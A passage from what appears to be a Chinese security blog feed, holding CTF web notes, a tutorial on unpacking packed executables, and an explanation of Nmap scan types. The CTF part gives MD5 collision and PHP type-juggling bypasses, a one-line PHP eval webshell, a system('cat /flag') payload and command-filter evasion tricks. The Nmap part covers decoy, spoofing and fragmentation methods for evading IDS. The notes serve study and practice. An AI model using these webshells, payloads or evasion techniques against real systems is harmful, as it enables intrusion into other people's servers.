title="相同的md5字符串"></a>相同的md5字符串</h5><p>a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>Param1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p><p>Param2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><p>$data1&#x3D;”\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70”;<br>$data2&#x3D;”\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70”;</p><h5 id="php弱类型绕过"><a href="#php弱类型绕过" class="headerlink" title="php弱类型绕过"></a>php弱类型绕过</h5><blockquote><p>MMHUWUV 0e701732711630150438129209816536<br>MAUXXQC 0e478478466848439040434801845361<br>IHKFRNS 0e256160682445802696926137988570<br>GZECLQZ 0e537612333747236407713628225676<br>GGHMVOE 0e362766013028313274586933780773<br>GEGHBXL 0e248776895502908863709684713578<br>EEIZDOI 0e782601363539291779881938479162<br>DYAXWCA 0e424759758842488633464374063001</p></blockquote><h5 id="php强类型比较"><a href="#php强类型比较" class="headerlink" title="php强类型比较"></a>php强类型比较</h5><blockquote><p>&#x3D;&#x3D;&#x3D;会连同数据类型一起比较，同时一些解析也被限制了。我们可以使用数组进行绕过。数组绕过是指我们传值的时候传一个数组上去，比如?id[]&#x3D;1,这个就是使用GET方法传值时候的操作。当md5函数遇到数组之后会返回空值，因为它无法加密数组，于是可以绕过php强类型比较。</p></blockquote><h4 id="php文件上传漏洞"><a href="#php文件上传漏洞" class="headerlink" title="php文件上传漏洞"></a>php文件上传漏洞</h4><p>一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个木马接受 POST 参数中0的值作为值, 我们可以使用蚁剑连接这个木马(密码为 0)<br>上传成功后会返回后端的判断代码, 此时可以知道我们上传的路径为 uploads且文件名不变</p><p>我们可以通过蚁剑进行连接</p><h4 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行"></a>php代码执行</h4><p><a href="https://www.php.net/manual/zh/function.eval.php">相关文档</a><br>我们可以利用 system 函数执行 Shell 命令,<br>也可用使用 echo file_get_contents(‘&#x2F;flag’); 来输出flag内容  </p><p>下面给出 system 的示例</p><blockquote><p>DT&#x3D;system(‘cat &#x2F;flag’);<br>注意用;来分隔，因为此时已经是一个php语句了</p></blockquote><p>解释:<br>system(‘cat &#x2F;flag’)：system() 函数用于执行系统命令。在这个例子中，system() 函数执行的是 cat &#x2F;flag，它会尝试读取系统中路径为 &#x2F;flag 的文件内容并输出到终端</p><blockquote><p>DT&#x3D;phpinfo();检查版本信息查漏洞</p></blockquote><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>在看了半个小时后终于懂了一点，反序列化就是利用已经存在的函数之间的调用，以及特殊方法绕过对应的检查后利用序列化函数生成一个可以在后面执行并获取代码的漏洞</p><p>POP chain<br>魔术方法：</p><blockquote><p>__construct()   &#x2F;&#x2F;对象创建(new)时会自动调用。<br>__wakeup()        &#x2F;&#x2F;使用unserialize时触发<br>__sleep()        &#x2F;&#x2F;使用serialize时触发<br>__destruct()        &#x2F;&#x2F;对象被销毁时触发<br>__call()        &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发<br>__callStatic()        &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发<br>__get()        &#x2F;&#x2F;用于从不可访问的属性读取数据 包括private或者是不存在的<br>__set()        &#x2F;&#x2F;用于将数据写入不可访问的属性<br>__isset()        &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发<br>__unset()         &#x2F;&#x2F;在不可访问的属性上使用unset()时触发<br>__toString()    &#x2F;&#x2F;把类当作字符串使用时触发<br>__invoke()             &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发  就是加了括号<br>__autoload()           &#x2F;&#x2F;在代码中当调用不存在的类时会自动调用该方法。<br>的序列化字符串在反序列化对象时与真实存在的参数个数不同时会跳过执行，即当前函数中只有一个参数$flag，若传入的序列化字符串中的参数个数为2即可绕过</p></blockquote><h4 id="RCE过滤"><a href="#RCE过滤" class="headerlink" title="RCE过滤"></a>RCE过滤</h4><h5 id="Windows系统支持的管道符如下："><a href="#Windows系统支持的管道符如下：" class="headerlink" title="Windows系统支持的管道符如下："></a>Windows系统支持的管道符如下：</h5><ol><li>“|”：直接执行后面的语句。</li><li>“||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol><h5 id="Linux系统支持的管道符如下："><a href="#Linux系统支持的管道符如下：" class="headerlink" title="Linux系统支持的管道符如下："></a>Linux系统支持的管道符如下：</h5><ol><li>“;”：执行完前面的语句再执行后面的语句。</li><li>“|”：显示后面语句的执行结果。</li><li>“||”：当前面的语句执行出错时，执行后面的语句。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol><h5 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h5><p><img src="https://gitee.com/fogpost/photo/raw/master/202409231119238.png" srcset="/img/loading.gif" lazyload></p><h5 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h5><p><a href="https://blog.csdn.net/Manuffer/article/details/120672448">参考</a></p><ul><li>cat <blockquote><p>cat\tac\more\less\head\tail\nl\tailf<br>单引号 c’’at<br>双引号 c””at<br>shell特殊变量 ca$@t</p></blockquote></li><li>空格<blockquote><p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等 %0a(url编码)<br>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。<br>同理，在后面加个$可以起到截断的作用，使用$9是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串</p></blockquote></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>脱壳教程第一课</title>
    <link href="/2024/09/18/%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E7%AC%AC%E4%B8%80%E8%AF%BE/"/>
    <url>/2024/09/18/%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E7%AC%AC%E4%B8%80%E8%AF%BE/</url>
    
    <content type="html"><![CDATA[<h3 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h3><p>首先查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181712588.png" srcset="/img/loading.gif" lazyload></p><h4 id="手脱"><a href="#手脱" class="headerlink" title="手脱"></a>手脱</h4><p>了解是upx直接od打开，直接往下面翻，或者用esp法直接找到popad跳转<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181714591.png" srcset="/img/loading.gif" lazyload><br>看到先call再jmp确认为OEP入口点<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181715614.png" srcset="/img/loading.gif" lazyload><br>直接od脱壳可运行直接不用管了</p><h3 id="NsPack"><a href="#NsPack" class="headerlink" title="NsPack"></a>NsPack</h3><h4 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h4><p>首先查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181716923.png" srcset="/img/loading.gif" lazyload><br>发现为北斗Nspack可以同上用手脱，或者采用ESP壳，在pushfd之后发现ESP改变，我们选择数据窗口中跟随，然后在数据窗口中选择断点，硬件访问，Word然后直接f9到达出栈位置<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181717350.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181717510.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181719918.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181720629.png" srcset="/img/loading.gif" lazyload><br>然后继续执行直到进入OEP，发现乱码，crtl+a进行分析，发现方法OEP特征<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181721792.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181722929.png" srcset="/img/loading.gif" lazyload><br>脱壳完毕可执行</p><h3 id="FSG"><a href="#FSG" class="headerlink" title="FSG"></a>FSG</h3><h4 id="FSG特殊的IAT修复以及查找"><a href="#FSG特殊的IAT修复以及查找" class="headerlink" title="FSG特殊的IAT修复以及查找"></a>FSG特殊的IAT修复以及查找</h4><p>手动在过程中我们发现这样一个跳转<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181724268.png" srcset="/img/loading.gif" lazyload>在下面的XOR处我们便会跳出函数，直接跑飞函数，但是在这之前有一个大循环，导致我们在一个判断函数之间跳转<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181725004.png" srcset="/img/loading.gif" lazyload><br>我们直接f4执行到此处，进入，发现OPE<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181726582.png" srcset="/img/loading.gif" lazyload><br>OPE在多次查阅之后发现<br>脱壳后发现问题<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181727890.png" srcset="/img/loading.gif" lazyload><br>在当前的exe程序中无法定位IAT入口点，我们用Import REC修复，在OEP入口点的call函数中我们f7进入查看<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181729836.png" srcset="/img/loading.gif" lazyload><br>发现这些红字调用，我们了解到这是对dll中一些函数的调用，右键一个调用call函数，在数据窗口中打开，选择内存地址，并在数据窗户口中选择长型地址来帮助我们查看<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181731502.png" srcset="/img/loading.gif" lazyload><br>找到这个数据窗口的上下界，计算差值，，按图中填入数值，了解我们的基地址是400000，大小写差值也可以写1000，之后选择无效函数删除，直接导入<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181732896.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181733944.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181735661.png" srcset="/img/loading.gif" lazyload></p><p>修理完成</p><h3 id="PECompact"><a href="#PECompact" class="headerlink" title="PECompact"></a>PECompact</h3><p>查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181737511.png" srcset="/img/loading.gif" lazyload><br>手脱技巧，在打开这个文件时，发现有大量的无效函数，我们选择分析之后直接执行，在PEC壳中有一个重要函数，ZxContinue，在发现这个函数时我们便可以进入，快速发现OEP<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181739058.png" srcset="/img/loading.gif" lazyload><br>也可以看我博客中的另外一个关于PECompact的壳</p><h3 id="ASProtect"><a href="#ASProtect" class="headerlink" title="ASProtect"></a>ASProtect</h3><p>查壳<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181759437.png" srcset="/img/loading.gif" lazyload><br>直接手托一路动就行，注意先分析一下，另外的方法看我的另一篇博客</p><h3 id="Upack"><a href="#Upack" class="headerlink" title="Upack"></a>Upack</h3><p>直接ESP即可脱壳</p><h3 id="yoda"><a href="#yoda" class="headerlink" title="yoda"></a>yoda</h3><p>这个也可以ESP</p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>扫描基础和方式</title>
    <link href="/2024/09/16/%E6%89%AB%E6%8F%8F%E5%9F%BA%E7%A1%80%E5%92%8C%E6%96%B9%E5%BC%8F/"/>
    <url>/2024/09/16/%E6%89%AB%E6%8F%8F%E5%9F%BA%E7%A1%80%E5%92%8C%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="前提概要"><a href="#前提概要" class="headerlink" title="前提概要"></a>前提概要</h3><p>在学习Nmap时我认为只要了解操作就行了不过，在思考之后我认为我们还是应该学习基本的原理和知识</p><h3 id="扫描基础"><a href="#扫描基础" class="headerlink" title="扫描基础"></a>扫描基础</h3><h4 id="3-5-1-TCP-三次握手"><a href="#3-5-1-TCP-三次握手" class="headerlink" title="3.5.1 TCP 三次握手"></a>3.5.1 TCP 三次握手</h4><p>第一步 - 客户端发起连接请求：</p><ul><li>客户端发送SYN（同步）包： 客户端向服务器发送一个TCP包，其中SYN标志位被设置为1，同时选择一个初始的序列号（Seq&#x3D;X）。<blockquote><p>源端口：随机端口号<br>目标端口：服务器的TCP端口号<br>SEQ：客户端选择的初始序列号<br>ACK：0<br>Flags：SYN&#x3D;1, ACK&#x3D;0, 其他标志位&#x3D;0<br>窗口大小：（根据需要设置</p></blockquote></li></ul><p>第二步 - 服务器回应连接请求：</p><ul><li>服务器发送SYN-ACK包： 服务器收到客户端的SYN包后，如果愿意建立连接，就向客户端发送一个响应，其中SYN和ACK标志位都被设置为1，同时服务器也选择一个初始的序列号（Seq&#x3D;Y），并确认客户端的序列号（Ack&#x3D;X+1）。<blockquote><p>源端口：服务器的TCP端口号<br>目标端口：客户端的随机端口号<br>SEQ：服务器选择的初始序列号<br>ACK：客户端的初始序列号+1<br>Flags：SYN&#x3D;1, ACK&#x3D;1, 其他标志位&#x3D;0<br>窗口大小：（根据需要设置）</p></blockquote></li></ul><p>第三步 - 客户端确认连接：</p><ul><li>客户端发送ACK包： 客户端收到服务器的SYN-ACK包后，向服务器发送确认包，其中ACK标志位设置为1，确认服务器的序列号（Ack&#x3D;Y+1）。<blockquote><p>源端口：随机端口号<br>目标端口：服务器的TCP端口号<br>SEQ：客户端的初始序列号+1<br>ACK：服务器的初始序列号+1<br>Flags：ACK&#x3D;1, 其他标志位&#x3D;0<br>窗口大小：（根据需要设置）</p></blockquote></li></ul><h3 id="扫描方式"><a href="#扫描方式" class="headerlink" title="扫描方式"></a>扫描方式</h3><h4 id="1-TCP-SYN-扫描"><a href="#1-TCP-SYN-扫描" class="headerlink" title="1 TCP SYN 扫描"></a>1 TCP SYN 扫描</h4><blockquote><p>nmap -sS ip</p></blockquote><p>TCP SYN 扫描是一种用于探测目标主机上开放端口的网络扫描技术。它属于 Nmap 工具中的一种扫描方式，通常用于获取目标系统的端口状态信息。TCP SYN 扫描的原理是发送TCP SYN包，根据目标主机的响应来判断端口的状态。</p><p>下面是 TCP SYN 扫描的工作原理：  </p><blockquote><p>发送TCP SYN包： 扫描发起者（通常是Nmap工具）向目标主机的指定端口发送TCP SYN包（同步包）。<br>等待响应： 如果目标端口是开放的，目标主机将返回一个TCP SYN&#x2F;ACK包（同步&#x2F;应答包）表示端口是开放的。如果目标端口是关闭的，目标主机将返回一个TCP RST包（复位包）表示端口是关闭的。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。如果收到了 SYN&#x2F;ACK 包，说明端口是开放的。如果收到了 RST 包，说明端口是关闭的。<br>不完全建立连接： 在完成第2步的过程中，扫描发起者不会完成TCP连接的建立，而是在收到响应后发送一个 RST 包，关闭连接。这样，扫描对目标系统的影响较小，因为它不会建立完整的连接。 </p></blockquote><h4 id="2-TCP-connect-扫描"><a href="#2-TCP-connect-扫描" class="headerlink" title="2 TCP connect() 扫描"></a>2 TCP connect() 扫描</h4><blockquote><p>此扫描为默认扫描，不用加参数</p></blockquote><p>TCP Connect 扫描是 Nmap 中的另一种常见的扫描技术。与 TCP SYN 扫描类似，TCP Connect 扫描也用于探测目标主机上的开放端口。它的工作原理是通过尝试建立完整的TCP连接来判断目标主机上的端口状态。</p><p>下面是 TCP Connect 扫描的工作原理：</p><blockquote><p>尝试建立完整的TCP连接： 扫描发起者向目标主机的指定端口尝试建立完整的TCP连接。<br>等待响应： 如果目标端口是开放的，目标主机将接受连接并返回一个TCP ACK包（应答包）表示端口是开放的。如果目标端口是关闭的，连接尝试将失败，扫描发起者将收到一个连接拒绝错误。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。如果连接成功建立，说明端口是开放的。如果连接被拒绝，说明端口是关闭的。<br>完成连接： 与 TCP SYN 扫描不同，TCP Connect 扫描会尝试建立完整的连接。因此，如果连接成功建立，扫描发起者可能会继续与目标主机交换一些数据。</p></blockquote><h4 id="3-UDP-扫描"><a href="#3-UDP-扫描" class="headerlink" title="3 UDP 扫描"></a>3 UDP 扫描</h4><blockquote><p>nmap -sU ip</p></blockquote><p>UDP（User Datagram Protocol）扫描是一种用于探测目标主机上开放的 UDP（非连接性协议）端口的扫描技术。与 TCP 扫描不同，UDP 扫描涉及到发送 UDP 数据包并分析目标主机的响应。由于 UDP 是面向无连接的协议，UDP 扫描相对复杂，因为没有类似于 TCP SYN&#x2F;ACK 的确认机制。</p><p>以下是 UDP 扫描的工作原理：</p><blockquote><p>发送UDP数据包： 扫描发起者向目标主机的指定 UDP 端口发送UDP数据包。<br>等待响应： 如果目标端口是开放的，目标主机将不发送响应，或者发送一个UDP应答包。如果目标端口是关闭的，目标主机通常会发送一个ICMP不可达消息。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。缺乏确认机制使得 UDP 扫描相对不稳定，因为目标主机可能选择不响应请求，或者响应包被防火墙过滤。<br>需要注意的是，UDP 扫描可能会面临一些挑战，包括：<br>不稳定性： 由于 UDP 的面向无连接性质，扫描可能会受到目标主机或防火墙的限制，导致结果不稳定。<br>响应解释： 分析 UDP 响应相对复杂，因为目标主机可以选择不响应，或者发送一些与端口状态无关的信息。<br>速度较慢： 由于UDP扫描涉及等待响应，可能需要较长时间来完成扫描。  </p></blockquote><h4 id="4-TCP-Null-扫描"><a href="#4-TCP-Null-扫描" class="headerlink" title="4 TCP Null 扫描"></a>4 TCP Null 扫描</h4><blockquote><p>nmap -sN ip</p></blockquote><p>TCP Null 扫描是 Nmap 工具中的一种扫描技术，用于探测目标主机上的开放端口。与 TCP SYN 扫描和 TCP Connect 扫描不同，TCP Null 扫描尝试利用 TCP 协议的一个特性，即发送一个不包含任何标志位的 TCP 报文，来判断端口的状态。</p><p>以下是 TCP Null 扫描的工作原理：</p><blockquote><p>发送TCP Null 包： 扫描发起者向目标主机的指定端口发送一个不包含任何标志位的 TCP 报文，即所有标志位均被设置为零。<br>等待响应： 如果目标端口是开放的，目标主机通常会忽略 TCP Null 报文，不发送任何响应。如果目标端口是关闭的，目标主机可能会发送一个 TCP RST（复位）包，表示端口是关闭的。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。缺乏任何标志位的 TCP Null 报文通常在正常操作中是不合法的，因此，如果收到响应，则可能表示端口是关闭的。  </p></blockquote><h4 id="5-TCP-FIN-扫描"><a href="#5-TCP-FIN-扫描" class="headerlink" title="5 TCP FIN 扫描"></a>5 TCP FIN 扫描</h4><blockquote><p>nmap -sF ip</p></blockquote><p>TCP FIN（Finish）扫描是 Nmap 工具中的一种扫描技术，用于探测目标主机上的开放端口。与 TCP SYN 扫描和 TCP Null 扫描类似，TCP FIN 扫描尝试利用 TCP 协议的一个特性，即发送一个不包含 SYN 标志位和其他标志位为零的 TCP 报文，来判断端口的状态。</p><p>以下是 TCP FIN 扫描的工作原理：</p><blockquote><p>发送TCP FIN 包： 扫描发起者向目标主机的指定端口发送一个不包含 SYN 标志位的 TCP 报文，即 FIN 标志位被设置为 1，而其他标志位均被设置为零。<br>等待响应： 如果目标端口是开放的，目标主机通常会忽略 TCP FIN 报文，不发送任何响应。如果目标端口是关闭的，目标主机可能会发送一个 TCP RST（复位）包，表示端口是关闭的。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。缺乏 SYN 标志位的 TCP FIN 报文通常在正常操作中是不合法的，因此，如果收到响应，则可能表示端口是关闭的。  </p></blockquote><h4 id="6-TCP-Xmas-扫描"><a href="#6-TCP-Xmas-扫描" class="headerlink" title="6 TCP Xmas 扫描"></a>6 TCP Xmas 扫描</h4><blockquote><p>nmap -sX ip</p></blockquote><p>TCP Xmas（也称为Christmas Tree）扫描是 Nmap 工具中的一种扫描技术，用于探测目标主机上的开放端口。TCP Xmas 扫描尝试利用 TCP 协议的一个特性，即发送一个所有标志位均被设置为 1 的 TCP 报文，来判断端口的状态。</p><p>以下是 TCP Xmas 扫描的工作原理：</p><blockquote><p>发送TCP Xmas 包： 扫描发起者向目标主机的指定端口发送一个所有标志位均被设置为 1 的 TCP 报文，即FIN、PSH、URG标志位均被设置为 1。<br>等待响应： 如果目标端口是开放的，目标主机通常会忽略 TCP Xmas 报文，不发送任何响应。如果目标端口是关闭的，目标主机可能会发送一个 TCP RST（复位）包，表示端口是关闭的。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。缺乏标准标志位的 TCP Xmas 报文通常在正常操作中是不合法的，因此，如果收到响应，则可能表示端口是关闭的。</p></blockquote><h4 id="7-TCP-ACK-扫描"><a href="#7-TCP-ACK-扫描" class="headerlink" title="7 TCP ACK 扫描"></a>7 TCP ACK 扫描</h4><blockquote><p>nmap -sA ip</p></blockquote><p>TCP ACK（Acknowledgment）扫描是 Nmap 工具中的一种扫描技术，用于确定目标主机上的端口状态。与其他 TCP 扫描技术不同，TCP ACK 扫描不关心端口是否开放，而是专注于获取目标主机对特定端口的响应。</p><p>以下是 TCP ACK 扫描的工作原理：</p><blockquote><p>发送TCP ACK包： 扫描发起者向目标主机的指定端口发送一个只设置 ACK 标志位的 TCP 报文。<br>等待响应： 无论目标端口是开放还是关闭，目标主机通常会返回一个 TCP RST（复位）包，表示对未建立连接的 ACK 请求的拒绝。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。如果收到 TCP RST 包，说明端口是关闭的；如果没有收到响应，说明端口可能是开放的或由防火墙过滤。</p></blockquote><p>####8 TCP 窗口扫描</p><blockquote><p>nmap -sW ip</p></blockquote><p>TCP窗口扫描是一种用于探测目标主机上开放端口的扫描技术。这种扫描技术主要关注TCP协议中的窗口字段（Window Size）。</p><blockquote><p>TCP窗口扫描的工作原理如下：<br>发送TCP包： 扫描发起者向目标主机的指定端口发送一个TCP包，其中SYN标志位被设置，但不设置ACK标志位。<br>等待响应： 如果目标端口是开放的，目标主机会响应一个包，其中SYN和ACK标志位都被设置，并且TCP窗口字段包含一个非零的值。如果目标端口是关闭的，目标主机可能会响应一个RST（复位）包，或者根本不响应。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。如果收到SYN&#x2F;ACK响应，并且TCP窗口字段的值不为零，那么端口可能是开放的。如果收到RST响应或者根本没有响应，那么端口可能是关闭的。</p></blockquote><h4 id="9-TCP-Maimon-扫描"><a href="#9-TCP-Maimon-扫描" class="headerlink" title="9 TCP Maimon 扫描"></a>9 TCP Maimon 扫描</h4><blockquote><p>nmap -sM ip</p></blockquote><p>在网络扫描领域中，TCP Maimon Scan（又称 Maimonides Scan）是一种比较罕见的扫描技术，其命名来源于古代犹太学者拉比·莫西·马蒙尼德斯（Moses Maimonides）。该扫描技术利用了 TCP 协议的一些特性来确定目标主机上的端口状态。</p><p>TCP Maimon Scan 的工作原理如下：</p><blockquote><p>发送TCP包： 扫描发起者向目标主机的指定端口发送一个TCP包，其中SYN和RST标志位都被设置，同时TCP窗口字段设置为零。<br>等待响应： 如果目标端口是开放的，目标主机会响应一个包，其中SYN、ACK和RST标志位都被设置，同时TCP窗口字段包含一个非零的值。如果目标端口是关闭的，目标主机可能会响应一个RST包。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。如果收到SYN&#x2F;ACK&#x2F;RST响应，并且TCP窗口字段的值不为零，那么端口可能是开放的。如果收到RST响应，那么端口可能是关闭的。  </p></blockquote><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><h4 id="1-报文分段"><a href="#1-报文分段" class="headerlink" title="1 报文分段"></a>1 报文分段</h4><blockquote><p>nmap -f ip</p></blockquote><p>-f 参数用于在发送的TCP数据包中进行报文分段（fragmentation）。报文分段是将大的数据包分成更小的片段以适应网络传输的过程。在网络安全领域，报文分段经常用于绕过一些网络防火墙或入侵检测系统的检测。一些防火墙和IDS&#x2F;IPS系统在处理大数据包时可能会存在漏洞，通过将数据包分成小片段，可以尝试绕过这些安全设备的检测。 </p><h4 id="2-最大传输单元"><a href="#2-最大传输单元" class="headerlink" title="2 最大传输单元"></a>2 最大传输单元</h4><blockquote><p>nmap –mtu 1500 ip</p></blockquote><p>–mtu 参数用于指定数据包的最大传输单元（MTU）。MTU是指一次能够通过通信链路的最大数据包大小。通过调整MTU，可以影响数据包的大小，从而可能绕过一些网络设备的检测。 </p><h4 id="3-诱饵隐藏扫描"><a href="#3-诱饵隐藏扫描" class="headerlink" title="3 诱饵隐藏扫描"></a>3 诱饵隐藏扫描</h4><blockquote><p>nmap -D &lt;ip,ip,ip……&gt; 目标 ip</p></blockquote><p>-D 参数在Nmap中用于进行诱饵（decoy）扫描，通过在扫描中伪装其他主机的IP地址，使得被扫描目标难以确定扫描的真实来源。这有助于混淆目标主机的入侵检测系统，使其难以追踪扫描的发起者。</p><h4 id="4-源地址哄骗"><a href="#4-源地址哄骗" class="headerlink" title="4 源地址哄骗"></a>4 源地址哄骗</h4><blockquote><p>nmap -S &lt;伪装的源 ip&gt; ip </p></blockquote><h4 id="5-源端口哄骗"><a href="#5-源端口哄骗" class="headerlink" title="5 源端口哄骗"></a>5 源端口哄骗</h4><blockquote><p>nmap –source-port 或 -g &lt;源端口号&gt; ip </p></blockquote><p>–source-port 和 -g 参数在Nmap中用于进行源端口欺骗（Source Port Spoofing）。它们允许你指定用于发送扫描请求的源端口号，这样可以对目标主机进行一些混淆，使得入侵检测系统难以准确追踪和识别扫描流量。 </p><h4 id="6-附加随机数据"><a href="#6-附加随机数据" class="headerlink" title="6  附加随机数据"></a>6  附加随机数据</h4><blockquote><p>nmap –data-length &lt;长度&gt; ip</p></blockquote><p>–data-length <number> 参数在Nmap中用于在发送的数据包中附加指定长度的随机数据。这个功能有助于混淆目标主机上的入侵检测系统，使得对扫描流量的分析更加困难。</p><p>####7 生存时间</p><blockquote><p>nmap –ttl &lt;值&gt; ip </p></blockquote><p>–ttl <value> 参数在Nmap中用于设置发送的数据包中的 IP Time-To-Live（TTL）字段的值。TTL是IP协议头部中的一个字段，用于指定数据包在网络上的最大生存时间，通常以跳数（hops）为单位。每经过一个路由器，TTL值就会减1，当TTL值减至0时，数据包将被丢弃，并且路由器会向源主机发送一个 ICMP Time Exceeded 错误消息。</p><h4 id="8-MAC-地址哄骗"><a href="#8-MAC-地址哄骗" class="headerlink" title="8 MAC 地址哄骗"></a>8 